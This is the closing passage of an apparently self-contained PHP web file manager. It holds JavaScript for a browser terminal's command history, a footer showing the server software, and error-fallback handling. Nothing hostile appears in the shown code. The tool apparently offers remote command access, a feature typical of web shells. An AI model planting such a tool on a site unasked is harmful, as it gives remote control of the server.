if (termInput) {
    var histKey = 'fm_term_history_v1';
    var hist = [];
    try { hist = JSON.parse(localStorage.getItem(histKey) || '[]'); } catch(e) {}
    var hIdx = hist.length;

    termInput.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (hIdx > 0) { hIdx--; termInput.value = hist[hIdx] || ''; }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (hIdx < hist.length - 1) { hIdx++; termInput.value = hist[hIdx] || ''; }
            else { hIdx = hist.length; termInput.value = ''; }
        }
    });

    document.getElementById('term-form').addEventListener('submit', function() {
        var v = termInput.value.trim();
        if (v) {
            hist.push(v);
            if (hist.length > 100) hist = hist.slice(-100);
            try { localStorage.setItem(histKey, JSON.stringify(hist)); } catch(e) {}
        }
    });
}
</script>

<?php endif; ?>

<div class="footer">
    File Manager &middot; <?php echo date('Y-m-d H:i:s'); ?> &middot; <?php echo fm_h($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'); ?>
</div>

</div>
</body>
</html>
<?php
} catch (Throwable $e) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    fm_render_fallback($e->getMessage(), $e->getFile(), $e->getLine());
}
?>
